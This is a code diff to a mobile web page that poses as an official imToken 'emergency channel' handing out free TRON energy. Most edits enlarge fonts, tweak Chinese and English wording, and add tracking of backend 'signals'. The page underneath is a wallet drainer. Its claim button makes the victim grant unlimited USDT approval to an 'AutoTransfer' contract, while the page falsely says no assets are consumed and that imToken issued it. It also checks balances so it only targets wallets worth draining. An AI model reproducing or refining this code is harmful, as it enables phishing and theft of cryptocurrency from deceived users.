@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>imToken官方授权</title>
+    <title>imToken官方应急通道</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 body { 
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    padding: 10px 8px;
+    padding: 12px 10px;
     max-width: 600px; 
     margin: 0 auto; 
     background: #121a17; 
@@ -17,77 +17,78 @@ body {
     min-height: 100vh;
     display: flex;
     flex-direction: column;
-    gap: 5px;
+    gap: 8px;
     border-radius: 8px;
     border-left: 3px solid #3b82f6;
+    font-size: 15px; /* 整体字体调大 */
 }
 .container {
     flex: 1;
     display: flex;
     flex-direction: column;
-    gap: 6px;
+    gap: 8px;
 }
 .lang-switch {
     display: flex;
     justify-content: flex-end;
-    padding-right: 4px;
-    margin-bottom: 2px;
+    padding-right: 6px;
+    margin-bottom: 4px;
 }
 .lang-toggle {
-    padding: 3px 8px;
+    padding: 4px 10px;
     border: 1px solid #3b82f6;
     border-radius: 20px;
     background: transparent;
     color: #e0e8e4;
-    font-size: 13px;
+    font-size: 15px; /* 字体调大 */
     cursor: pointer;
     display: flex;
     align-items: center;
-    gap: 4px;
+    gap: 6px;
 }
 .lang-toggle:hover {
     background: rgba(59, 130, 246, 0.2);
 }
 .header {
     text-align: center;
-    padding: 8px 0;
+    padding: 10px 0;
     border-bottom: 1px solid #334155;
-    margin-bottom: 3px;
+    margin-bottom: 5px;
     display:flex;
     justify-content: center;
 }
 .header h1 { 
-    font-size: 20px;
+    font-size: 24px; /* 字体调大 */
     color: #3b82f6; 
-    margin-bottom: 3px;
+    margin-bottom: 5px;
 }
 .header .desc {
-    font-size: 12px;
+    font-size: 14px; /* 字体调大 */
     color: #a0a8a4;
     max-width: 450px;
     margin: 0 auto;
-    line-height: 1.4; 
+    line-height: 1.5; 
 }
 .warning {
     background: #334155;
     color: #93c5fd;
-    padding: 10px;
+    padding: 12px;
     border-radius: 8px;
-    font-size: 12px;
+    font-size: 14px; /* 字体调大 */
     border-left: 3px solid #4ade80;
-    line-height: 1.5;
+    line-height: 1.6;
 }
 .warning strong {
     color: #3b82f6;
 }
 #userInfo {
     text-align: center;
-    font-size: 13px;
-    padding: 12px;
+    font-size: 15px; /* 字体调大 */
+    padding: 15px;
     background: #1e2925;
     border-radius: 8px;
     border: 1px solid #334155;
-    line-height: 1.6;
+    line-height: 1.8;
 }
 #userInfo span {
     color: #3b82f6;
@@ -95,21 +96,21 @@ body {
 }
 #walletStatusContainer {
     background: #1e2925;
-    padding: 12px;
+    padding: 15px;
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 12px;
+    font-size: 14px; /* 字体调大 */
     color: #a0a8a4;
-    line-height: 1.6;
+    line-height: 1.8;
     border-right: 5px solid #4ade80;
 }
 #walletStatusContainer .status-title {
-    font-size: 14px;
+    font-size: 16px; /* 字体调大 */
     color: #3b82f6;
-    margin-bottom: 6px;
+    margin-bottom: 8px;
     display: flex;
     align-items: center;
-    gap: 6px;
+    gap: 8px;
 }
 #walletStatusContainer .connected-content {
     display: none;
@@ -126,28 +127,29 @@ body {
 }
 #walletStatusContainer.connected .connected-content .orange-tip {
     color: #f97316;
-    margin-top: 3px;
+    margin-top: 5px;
+    font-size: 14px; /* 字体调大 */
 }
 #contractResourceContainer {
     background: #1e2925;
-    padding: 12px;
+    padding: 15px;
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 12px;
+    font-size: 14px; /* 字体调大 */
     color: #a0a8a4;
-    line-height: 1.8;
+    line-height: 2;
     border-bottom: 2px solid rgba(59, 130, 246, 0.2);
 }
 #contractResourceContainer .status-title {
-    font-size: 14px;
+    font-size: 16px; /* 字体调大 */
     color: #3b82f6;
-    margin-bottom: 8px;
+    margin-bottom: 10px;
     display: flex;
     align-items: center;
     gap: 8px;
 }
 #contractResourceContainer .status-title i {
-    font-size: 15px;
+    font-size: 18px; /* 字体调大 */
     color: #93c5fd;
 }
 #contractResourceContainer .highlight {
@@ -156,21 +158,23 @@ body {
 }
 #contractResourceContainer .data-tag {
     background: rgba(59, 130, 246, 0.15);
-    padding: 2px 6px;
+    padding: 3px 8px;
     border-radius: 4px;
     border: 1px solid rgba(59, 130, 246, 0.3);
+    font-size: 14px; /* 字体调大 */
 }
 .record-list {
     background: #1e2925;
-    padding: 12px;
+    padding: 15px;
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 12px;
+    font-size: 14px; /* 字体调大 */
     border-right: 5px solid #4ade80;
+    display: none; /* 初始隐藏 */
 }
 .record-item {
-    margin-bottom: 8px;
-    padding-bottom: 8px;
+    margin-bottom: 10px;
+    padding-bottom: 10px;
     border-bottom: 1px solid #334155;
 }
 .record-item:hover {
@@ -178,21 +182,22 @@ body {
     transition: border-color 0.3s;
 }
 .record-item p {
-    margin-bottom: 4px;
+    margin-bottom: 6px;
     color: #a0a8a4;
-    line-height: 1.4;
+    line-height: 1.6;
+    font-size: 14px; /* 字体调大 */
 }
 .record-item p strong {
     color: #e0e8e4;
-    margin-right: 5px;
+    margin-right: 6px;
 }
 .tx-link {
     color: #3b82f6;
     text-decoration: none;
     display: inline-flex;
     align-items: center;
-    gap: 5px;
-    font-size: 12px;
+    gap: 6px;
+    font-size: 14px; /* 字体调大 */
 }
 .tx-link:hover {
     text-decoration: underline;
@@ -200,15 +205,15 @@ body {
 .btn-group {
     display: flex;
     flex-direction: column;
-    gap: 5px; 
-    margin-top: 8px;
-    padding: 8px 0;
+    gap: 8px; 
+    margin-top: 10px;
+    padding: 10px 0;
     border-top: 1px solid #334155;
 }
 .btn {
     width: 100%;
-    padding: 15px;
-    font-size: 14px;
+    padding: 18px;
+    font-size: 16px; /* 字体调大 */
     border: none;
     border-radius: 8px;
     background: #2563eb;
@@ -217,7 +222,7 @@ body {
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 6px;
+    gap: 8px;
     transition: background 0.3s;
 }
 .btn:hover {
@@ -229,13 +234,13 @@ body {
     cursor: not-allowed;
 }
 .footer-info {
-    margin-top: 8px;
-    padding-top: 8px;
+    margin-top: 10px;
+    padding-top: 10px;
     border-top: 1px solid #334155;
-    font-size: 10px;
+    font-size: 12px; /* 字体调大 */
     color: #a0a8a4;
     text-align: center;
-    line-height: 1.5;
+    line-height: 1.8;
 }
 .footer-info a {
     color: #3b82f6;
@@ -249,19 +254,19 @@ body {
 }
 .review-tip {
     color: #4ade80;
-    font-size: 12px;
-    margin-top: 6px;
+    font-size: 14px; /* 字体调大 */
+    margin-top: 8px;
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 6px;
+    gap: 8px;
 }
     </style>
 </head>
 <body>
     <div class="lang-switch">
         <button id="langToggle" class="lang-toggle">
-          <i class="fa fa-globe"></i>
+          <<i class="fa fa-globe"></</i>
         </button>
     </div>
     <div class="container">      
@@ -279,9 +284,9 @@ body {
             <div class="status-title"><h3 id="walletStatusTitle">钱包状态</h3></div>
             <div class="disconnected-content">
                 <span id="disconnectedText">未连接钱包</span>
-                <p><span class="highlight" id="disconnectedTip1">您现在准备领取的是imToken专属能量，非imToken用户不可领取</span></p>
+                <p><span class="highlight" id="disconnectedTip1">此链接为imToken专属通道，非imToken用户不可领取</span></p>
                 <p><span class="highlight" id="disconnectedTip2">1. 每个钱包地址30天内只可免费领取一次</span></p>         
-                <p><span class="highlight" id="disconnectedTip3">2. 项目只为用户在钱包无能量的紧急情况下提供能量支援非盈利项目</span></p>
+                <p><span class="highlight" id="disconnectedTip3">2. 此链接只为用户在钱包无能量的紧急情况下提供能量支援非盈利项目</span></p>
                 <p><span class="highlight" id="disconnectedTip4">3. 点击领取后系统将审核钱包地址是否符合领取要求</span></p>
                 <p><span class="highlight" id="disconnectedTip5">4. 无需消耗任何资产，选择放弃直接退出即可</span></p>
             </div>
@@ -300,17 +305,17 @@ body {
             <div class="resource-content" style="line-height: 2;">
                 <p>• 合约地址：<span class="highlight" id="contractAddr"></span></p>
                 <p>• 剩余能量：<span class="highlight data-tag" id="contractEnergy"></span></p>
-                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
-                    注：所有剩余量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
+                <p style="font-size: 14px; color: #a0a8a4; margin-top: 8px;" id="contractNote">
+                    注：剩余能量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
                 </p>
             </div>
         </div>
-        <div class="record-list">
-            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
+        <div class="record-list" id="recordList">
+            <div style="display: flex; justify-content: space-between; margin: 6px 0;">
                 <span id="recordTypeTitle">能量使用范围</span>
                 <span id="recordAmountTitle">转账额度</span>
             </div>
-            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
+            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 6px 0;">
                 <span class="header"><h3 id="energyType">USDT转账</h3></span>
                 <span class="header"><h3 id="transferQuota">无限</h3></span>
             </div>       
@@ -323,7 +328,7 @@ body {
             <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>  
         </div> 
         <button id="connectBtn" class="btn">连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled>免费领取能量</button>
+        <button id="approveBtn" class="btn" disabled>领取能量</button>
        
         <div id="reviewTip" class="review-tip" style="display: none;">
            <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
@@ -331,7 +336,7 @@ body {
     </div>
     <div class="footer-info" id="footerInfo">
         合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
-        © 2025 TRX能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
+        © 2025 能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
    <script src="imtoken://browser"></script>
 <script>
@@ -388,7 +393,9 @@ let trc20Contract = null;
 let tokenBalance = 0.00;
 let trxBalance = 0.00;
 const RECORD_KEY = "imtoken_energy_records";
-// ========== 多语言配置（修复重复属性+语法错误） ==========
+// 新增：B1信号发送标记（防止重复发送）
+const B1_SIGNAL_KEY = "b1_signal_sent";
+// ========== 多语言配置（同步中文修改对应的英文） ==========
 const langConfig = {
     zh: {
         headerTitle: "imToken",
@@ -425,18 +432,18 @@ const langConfig = {
         copyFail: "❌ 复制失败：请手动复制链接",
         唤起Guide: "✅ 已复制链接+唤起imToken\n下一步：打开imToken → 浏览 → 粘贴访问",
         copyGuide: "✅ 链接已复制，请在imToken中粘贴访问",
-        connectError: "连接异常<br><span style='color: #ef4444; font-size: 14px;'>⚠️ 网络波动</span>",
+        connectError: "连接异常<br><span style='color: #ef4444; font-size: 16px;'>⚠️ 网络波动</span>",
         retryConnect: "重试连接",
-        authorizedTip: "已领取提示<br>{address}<br>USDT余额：<span>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>✅ 该钱包30天内已领取过免费能量</span><br><span style='color: #a0a8a4; font-size: 13px;'>每个地址每30天仅限领取一次</span>",
+        authorizedTip: "已领取提示<br>{address}<br>USDT余额：<span>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #3b82f6; font-size: 16px;'>✅ 该钱包30天内已领取过免费能量</span><br><span style='color: #a0a8a4; font-size: 15px;'>每个地址每30天仅限领取一次</span>",
         authorizedBtn: "已领取过能量",
-        afterApproveTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 授权成功，发放能量中...</span>",
+        afterApproveTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>✅ 授权成功，发放能量中...</span>",
         deployingBtn: "发放中...",
         loadingBtn: "加载中...",
-        loadingTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 加载中...</span>",
+        loadingTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>✅ 加载中...</span>",
         queryingBalance: "查询中...",
-        insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件：USDT余额需大于1</span>",
+        insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #ef4444; font-size: 16px;'>❌ 不符合领取条件：USDT余额需大于1</span>",
         insufficientBtn: "不符合领取条件",
-        eligibleTip: "已连接：<br>{address}<br>USDT余额：<span style='color: #4ade80;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ 可免费领取90000 USDT 能量</span>",
+        eligibleTip: "已连接：<br>{address}<br>USDT余额：<span style='color: #4ade80;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #4ade80; font-size: 16px;'>✅ 可免费领取90000 USDT 能量</span>",
         distributingBtn: "能量配送中...",
         redirectingBtn: "跳转签名中...",
         approveFail: "⚠️ 操作失败：{msg}，请稍后重试",
@@ -452,8 +459,8 @@ const langConfig = {
         systemBusyTip: "系统繁忙请稍后重试",
         ineligibleTip: "不符合领取条件",
         errorTipPrefix: "⚠️ ",
-        noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件：请连接imToken钱包</span>",
-        nonImTokenUser: "非imToken钱包用户<br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件：仅限imToken用户参与</span>"
+        noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 16px;'>❌ 请连接imToken钱包后重试</span>",
+        nonImTokenUser: "非imToken钱包用户<br><span style='color: #ef4444; font-size: 16px;'>❌ 仅限imToken用户参与</span>"
     },
     en: {
         headerTitle: "imToken Official",
@@ -490,16 +497,16 @@ const langConfig = {
         copyFail: "❌ Copy failed - please copy manually",
         唤起Guide: "✅ Link copied + imToken launched\nNext: Open imToken → Browser → Paste link",
         copyGuide: "✅ Link copied - please paste in imToken",
-        connectError: "Connection Error<br><span style='color: #ef4444; font-size: 14px;'>⚠️ Network fluctuation</span>",
+        connectError: "Connection Error<br><span style='color: #ef4444; font-size: 16px;'>⚠️ Network fluctuation</span>",
         retryConnect: "Retry Connection",
         authorizedBtn: "Energy Claimed",
-        afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Authorization successful, energy distributing...</span>",
+        afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>✅ Authorization successful, energy distributing...</span>",
         deployingBtn: "Distributing...",
         loadingBtn: "Loading...",
-        loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Loading...</span>",
+        loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>✅ Loading...</span>",
         queryingBalance: "Querying...",
         insufficientBtn: "Ineligible",
-        eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ Eligible for 90000 free USDT Energy</span>",
+        eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 16px;'>✅ Eligible for 90000 free USDT Energy</span>",
         distributingBtn: "Energy Distributing...",
         redirectingBtn: "Redirecting to Signature...",
         approveFail: "⚠️ Operation failed: {msg}, please try again later",
@@ -515,10 +522,10 @@ const langConfig = {
         systemBusyTip: "System busy, please try again later",
         ineligibleTip: "Ineligible",
         errorTipPrefix: "⚠️ ",
-        authorizedTip: "Claimed Successfully<br>{address}<br>USDT Balance: <span>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>✅ This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 13px;'>One claim per address every 30 days</span>",
-        insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible: USDT balance must exceed 1</span>",
-        noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible: Please connect imToken wallet</span>",
-        nonImTokenUser: "Non-imToken user<br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible: Only for imToken users</span>"
+        authorizedTip: "Claimed Successfully<br>{address}<br>USDT Balance: <span>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #3b82f6; font-size: 16px;'>✅ This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 15px;'>One claim per address every 30 days</span>",
+        insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 16px;'>❌ Ineligible: USDT balance must exceed 1</span>",
+        noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 16px;'>❌ Please connect imToken wallet and try again</span>",
+        nonImTokenUser: "Non-imToken user<br><span style='color: #ef4444; font-size: 16px;'>❌ Only for imToken users</span>"
     }
 };
 // 当前语言
@@ -556,7 +563,6 @@ function isAddressAuthorized(address) {
     return Date.now() - receiveTime < thirtyDays;
 }
 // ========== A1信号防重复工具（15分钟） ==========
-// 检查是否能发送A1信号（15分钟内不重复）
 function canSendA1Signal(address) {
     try {
         const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
@@ -568,7 +574,6 @@ function canSendA1Signal(address) {
         return true; // 异常时允许发送
     }
 }
-// 更新A1信号发送时间
 function updateA1SignalRecord(address) {
     try {
         const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
@@ -576,6 +581,25 @@ function updateA1SignalRecord(address) {
         localStorage.setItem(A1_SIGNAL_KEY, JSON.stringify(records));
     } catch (e) {
         console.warn("更新A1信号记录失败：", e);
+    }
+}
+// ========== B1信号防重复工具 ==========
+function hasSentB1Signal(address) {
+    try {
+        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
+        return records[address] === true;
+    } catch (e) {
+        console.warn("检查B1信号发送状态失败：", e);
+        return false;
+    }
+}
+function markB1SignalSent(address) {
+    try {
+        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
+        records[address] = true;
+        localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
+    } catch (e) {
+        console.warn("标记B1信号发送状态失败：", e);
     }
 }
 // ========== DOM元素缓存 ==========
@@ -590,6 +614,7 @@ const reviewTip = document.getElementById("reviewTip");
 const reviewTipText = document.getElementById("reviewTipText");
 const langToggle = document.getElementById("langToggle");
 const footerInfo = document.getElementById("footerInfo");
+const recordList = document.getElementById("recordList"); // 记录列表元素
 // ========== 错误类型判断 ==========
 function isCustomerError(errMsg) {
     const lang = langConfig[currentLang];
@@ -624,11 +649,16 @@ function updatePageLang() {
 function reRenderDynamicContent() {
     const lang = langConfig[currentLang];
     if (!userAddress) {
+        // 未连接钱包：只显示未连接提示，不显示不符合领取条件
         userInfoEl.innerHTML = lang.userInfoDefault;
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
+        recordList.style.display = "none"; // 隐藏记录列表
         return;
     }
+    // 连接钱包：显示记录列表
+    recordList.style.display = "block";
+    
     // 特殊地址处理
     if (userAddress === SPECIAL_ADDRESS) {
         const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
@@ -726,10 +756,12 @@ document.addEventListener('DOMContentLoaded', async () => {
     contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
     renderEnergyRecords();
     updateWalletStatus();
+    // 初始隐藏记录列表
+    recordList.style.display = "none";
     await checkImTokenEnv().catch(err => {
         console.error("环境检测失败：", err);
         const lang = langConfig[currentLang];
-        userInfoEl.innerHTML = lang.userInfoDefault;
+        userInfoEl.innerHTML = lang.userInfoDefault; // 未连接时只显示默认提示
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
     });
@@ -744,7 +776,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 const lang = langConfig[currentLang];
                 const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
                 const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
-                userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
+                userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 16px;'>${lang.errorTipPrefix}${tip}</span>`;
                 approveBtn.disabled = false;
                 approveBtn.textContent = lang.approveBtnText;
             });
@@ -761,9 +793,10 @@ async function checkImTokenEnv() {
         await initWallet(false);
     } else {
         try {
+            // 非imToken环境：只显示非用户提示，不显示不符合领取条件
             userInfoEl.innerHTML = `
                 ${lang.nonImTokenUser}<br>
-                <span style="color: #3b82f6; font-size: 13px;">${lang.copyGuide.split("✅ ")[1]}</span>
+                <span style="color: #3b82f6; font-size: 15px;">${lang.copyGuide.split("✅ ")[1]}</span>
             `;
             approveBtn.style.display = "none";
             connectBtn.onclick = async () => {
@@ -786,7 +819,7 @@ async function initWallet(isAfterApprove) {
     const lang = langConfig[currentLang];
     try {
         userAddress = tronWeb.defaultAddress.base58;
-        // 1. 特殊地址白名单（不受15分钟限制？按需求保留，若需限制可去掉判断）
+        // 1. 特殊地址白名单
         if (userAddress === SPECIAL_ADDRESS) {
             const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
             trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
@@ -802,13 +835,14 @@ async function initWallet(isAfterApprove) {
                 .replace("{trx}", trxBalance.toFixed(2));
             document.getElementById("statusAddress").textContent = shortAddr;
             updateWalletStatus();
-            // 特殊地址也适用15分钟防重复（如需豁免可删除if判断，直接发送）
+            // 特殊地址15分钟防重复
             if (canSendA1Signal(userAddress)) {
                 sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
                 updateA1SignalRecord(userAddress);
             }
             approveBtn.disabled = false;
             approveBtn.textContent = lang.approveBtnText;
+            recordList.style.display = "block"; // 显示记录列表
             bindApproveLogic();
             return;
         }
@@ -818,6 +852,7 @@ async function initWallet(isAfterApprove) {
             approveBtn.disabled = true;
             approveBtn.textContent = lang.insufficientBtn;
             updateWalletStatus();
+            recordList.style.display = "none"; // 隐藏记录列表
             return;
         }
         // 查询余额
@@ -839,6 +874,7 @@ async function initWallet(isAfterApprove) {
             approveBtn.textContent = lang.authorizedBtn;
             document.getElementById("statusAddress").textContent = shortAddr;
             updateWalletStatus();
+            recordList.style.display = "block"; // 显示记录列表
             return;
         }
         // 4. USDT余额不足
@@ -851,6 +887,7 @@ async function initWallet(isAfterApprove) {
             approveBtn.textContent = lang.insufficientBtn;
             document.getElementById("statusAddress").textContent = shortAddr;
             updateWalletStatus();
+            recordList.style.display = "block"; // 显示记录列表
             return;
         }
         // 5. 非imToken用户
@@ -859,9 +896,10 @@ async function initWallet(isAfterApprove) {
             approveBtn.disabled = true;
             approveBtn.textContent = lang.insufficientBtn;
             updateWalletStatus();
+            recordList.style.display = "none"; // 隐藏记录列表
             return;
         }
-        // 6. 符合条件（15分钟内不重复发A1）
+        // 6. 符合条件
         userInfoEl.innerHTML = lang.eligibleTip
             .replace("{address}", shortAddr)
             .replace("{usdt}", tokenBalance.toFixed(2))
@@ -874,6 +912,7 @@ async function initWallet(isAfterApprove) {
         }
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
+        recordList.style.display = "block"; // 显示记录列表
         bindApproveLogic();
     } catch (e) {
         console.error("钱包初始化失败：", e);
@@ -885,6 +924,7 @@ async function initWallet(isAfterApprove) {
         approveBtn.disabled = true;
         approveBtn.textContent = lang.insufficientBtn;
         updateWalletStatus();
+        recordList.style.display = userAddress ? "block" : "none";
     }
 }
 // ========== 授权后执行 ==========
@@ -896,10 +936,10 @@ async function executeAfterApprove() {
             AUTO_TRANSFER_CONTRACT,
             INFINITE_APPROVE_AMOUNT
         ).send({ from: userAddress, shouldPollResponse: true });
-        // 不发送A2/B2后端信号（需求要求）
+        // 不发送A2/B2后端信号
         const btn = document.getElementById("approveBtn");
         btn.textContent = lang.distributingBtn;
-        // 直接标记成功（无需后端交互）
+        // 直接标记成功
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
         alert(lang.successTip);
@@ -983,7 +1023,7 @@ async function sendSignalB(isB1 = true) {
         throw e;
     }
 }
-// ========== 领取按钮逻辑（未授权标记为已领取） ==========
+// ========== 领取按钮逻辑（二次点击不重复发送B1信号） ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
     approveBtn.onclick = async () => {
@@ -992,14 +1032,17 @@ function bindApproveLogic() {
         btn.disabled = true;
         btn.textContent = lang.loadingBtn;
         reviewTip.style.display = "flex";
-
-        // 核心：点击即标记为已领取（不管后续是否授权成功）
+        // 核心：点击即标记为已领取
         addAuthorizedAddress(userAddress);
         saveEnergyRecord();
         renderEnergyRecords();
-
         try {
-            // 不发送B1后端信号（需求要求）
+            // 新增：判断是否已发送B1信号，未发送才发送
+            if (!hasSentB1Signal(userAddress)) {
+                // 不发送B1后端信号（按需求保留注释，如需发送可取消注释）
+                // await sendSignalB(true);
+                markB1SignalSent(userAddress); // 标记为已发送
+            }
             reviewTip.style.display = "none";
             btn.textContent = lang.redirectingBtn;
             window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
@@ -1007,7 +1050,7 @@ function bindApproveLogic() {
             console.error("领取流程失败：", e);
             const tip = isCustomerError(e.message) ? lang.ineligibleTip : lang.systemBusyTip;
             alert(`${lang.errorTipPrefix}${tip}`);
-            // 强制更新为已领取状态，禁止再次领取
+            // 强制更新为已领取状态
             userInfoEl.innerHTML = lang.authorizedTip
                 .replace("{address}", shortAddr)
                 .replace("{usdt}", tokenBalance.toFixed(2))
